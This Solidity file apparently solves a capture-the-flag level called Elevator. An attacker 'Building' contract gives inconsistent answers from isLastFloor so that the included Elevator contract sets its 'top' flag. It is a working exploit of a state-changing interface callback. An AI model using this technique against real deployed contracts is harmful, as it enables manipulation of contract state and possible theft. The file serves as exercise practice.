// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

/* Interface used here as reference
interface Building {
  function isLastFloor(uint) external returns (bool);
}
*/

contract Building {
    
    Elevator elevator;
    uint fakeTopFloor;
    
    constructor(address _elevator) public {
        elevator = Elevator(_elevator);
    }
    
    function isLastFloor(uint _floor) external returns (bool) {
        if (_floor == fakeTopFloor) {
            fakeTopFloor -= _floor;
            
            return false;
        }
        
        return true;
    }

    function toTheTop(uint _fakeTopFloor) public {
        fakeTopFloor = _fakeTopFloor;
        
        elevator.goTo(fakeTopFloor);
    }
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}